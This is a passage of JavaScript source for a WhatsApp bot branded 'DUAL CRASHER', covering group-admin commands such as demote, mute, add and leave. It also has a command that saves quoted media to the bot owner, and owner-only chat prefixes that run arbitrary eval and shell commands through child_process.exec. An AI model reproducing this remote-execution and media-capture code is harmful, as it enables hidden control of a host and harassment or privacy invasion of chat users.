  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'demote');
  reply("``` User demoted from admin```");
}
break;


case 'mute': {
  if (!m.isGroup) return reply("```Group command only```");
  if (!isAdmins) return reply("```Admins only```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin```");

  await rich.groupSettingUpdate(m.chat, 'announcement');
  reply("``` Group muted. Only admins can send messages now.```");
}
break;


case 'unmute': {
  if (!m.isGroup) return reply("``` Group command only```");
  if (!isAdmins) return reply("``` Admins only```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin```");

  await rich.groupSettingUpdate(m.chat, 'not_announcement');
  reply("``` Group unmuted. Everyone can send messages.```");
}
break;


case 'left': {
  if (!isCreator) return reply("```For Owner only```");
  await rich.groupLeave(m.chat);
  reply("``` Bot left the group```");
}
break;


case 'add': {
  if (!isCreator) return reply("``` For Owner only```");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("``` Bot must be admin```");

  let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'add');
  reply("``` User added to group```");
}
break;

case 'download':
case 'save':
case 'svt': {
  if (!isPremium) return reply("```for Owner only```.");
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      rich.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      rich.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break;

case 'runtime': case 'alive': { 
         reply(`\`\`\`DUAL CRASHER\`\`\`\n\◈ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${runtime(process.uptime())}`); 
}
break
 case 'ping': case 'speed': { 

let timestamp = speed()
let latensi = speed() - timestamp
         reply (`\`\`\`DUAL CRASHER\`\`\`\n\◈ 𝚂𝙿𝙴𝙴𝙳 : ${latensi.toFixed(4)} 𝐌𝐒`); 
}
break;
case 'public': {
    if (!isCreator) return m.reply("Owner only.");
    rich.public = true;
    m.reply("Bot set to public mode.");
}
break;
case 'private': case 'self': {
    if (!isCreator) return m.reply("Owner only.");
    rich.public = false;
    m.reply("Bot set to private mode.");
}
break;

// crahh flood end

default:
// ===================== Async Eval (Prefix: <) =======================
    if (budy.startsWith('<')) {
        if (!isCreator) return;

        function Return(sul) {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined) {
                bang = util.format(sul)
            }
            return reply(bang)
        }

        try {
            reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
        } catch (e) {
            reply(String(e))
        }
    }

// ===================== Eval Biasa (Prefix: >) =======================
    if (budy.startsWith('>')) {
        if (!isCreator) return;

        try {
            let evaled = await eval(budy.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await reply(evaled)
        } catch (err) {
            await reply(String(err))
        }
    }

// ===================== Terminal Command (Prefix: $) ===============
    if (budy.startsWith('$')) {
        if (!isCreator) return;

        require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`)
            if (stdout) return reply(stdout)
        })
    }

}
} catch (err) {
    console.log(require("util").format(err));
}

// ===================== Auto Update ===============================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})
}
// ===================== End All ===================================